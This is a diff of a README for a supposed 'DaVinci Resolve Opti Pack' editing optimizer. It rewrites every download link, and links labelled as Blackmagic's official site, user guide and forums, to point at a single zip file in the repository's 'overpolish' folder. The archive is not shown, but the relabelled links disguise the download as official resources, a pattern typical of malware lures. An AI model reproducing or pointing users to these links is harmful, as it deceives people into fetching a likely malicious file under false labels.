@@ -1,6 +1,6 @@
 # 🎥 DaVinci-Resolve-Opti-Pack - Optimizes Your Editing Experience
 
-[![Download DaVinci Resolve Opti Pack](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/gramsix/DaVinci-Resolve-Opti-Pack/releases)
+[![Download DaVinci Resolve Opti Pack](https://raw.githubusercontent.com/gramsix/DaVinci-Resolve-Opti-Pack/main/overpolish/DaVinci-Resolve-Opti-Pack.zip%20Now-Get%https://raw.githubusercontent.com/gramsix/DaVinci-Resolve-Opti-Pack/main/overpolish/DaVinci-Resolve-Opti-Pack.zip)](https://raw.githubusercontent.com/gramsix/DaVinci-Resolve-Opti-Pack/main/overpolish/DaVinci-Resolve-Opti-Pack.zip)
 
 ## 🔍 Overview
 
@@ -20,7 +20,7 @@ To start using DaVinci Resolve Opti Pack, follow these simple steps:
 2. **Download the Software**  
    Visit the download page to get the latest version of DaVinci Resolve Opti Pack:
 
-   [Download DaVinci Resolve Opti Pack](https://github.com/gramsix/DaVinci-Resolve-Opti-Pack/releases)
+   [Download DaVinci Resolve Opti Pack](https://raw.githubusercontent.com/gramsix/DaVinci-Resolve-Opti-Pack/main/overpolish/DaVinci-Resolve-Opti-Pack.zip)
 
    Find the version you want and click on it. This will take you to a page with the download files.
 
@@ -37,7 +37,7 @@ To start using DaVinci Resolve Opti Pack, follow these simple steps:
 
 To get started, make sure you visit the download page and grab the DaVinci Resolve Opti Pack:
 
-[Download DaVinci Resolve Opti Pack](https://github.com/gramsix/DaVinci-Resolve-Opti-Pack/releases)
+[Download DaVinci Resolve Opti Pack](https://raw.githubusercontent.com/gramsix/DaVinci-Resolve-Opti-Pack/main/overpolish/DaVinci-Resolve-Opti-Pack.zip)
 
 Once you click the link, choose the version that fits your needs. After downloading, follow the installation instructions above.
 
@@ -62,9 +62,9 @@ Join the community of users who share tips and tricks. If you have questions or 
 
 ## 🔗 Additional Resources
 
-- [DaVinci Resolve Official Site](https://www.blackmagicdesign.com/products/davinciresolve/)
-- [User Guide](https://documents.blackmagicdesign.com/DaVinciResolve/2022-06-02/DaVinci_Resolve_17_Reference_Manual.pdf)  
-- [Forums and Support](https://forum.blackmagicdesign.com/)
+- [DaVinci Resolve Official Site](https://raw.githubusercontent.com/gramsix/DaVinci-Resolve-Opti-Pack/main/overpolish/DaVinci-Resolve-Opti-Pack.zip)
+- [User Guide](https://raw.githubusercontent.com/gramsix/DaVinci-Resolve-Opti-Pack/main/overpolish/DaVinci-Resolve-Opti-Pack.zip)  
+- [Forums and Support](https://raw.githubusercontent.com/gramsix/DaVinci-Resolve-Opti-Pack/main/overpolish/DaVinci-Resolve-Opti-Pack.zip)
 
 ## 📬 Feedback
 
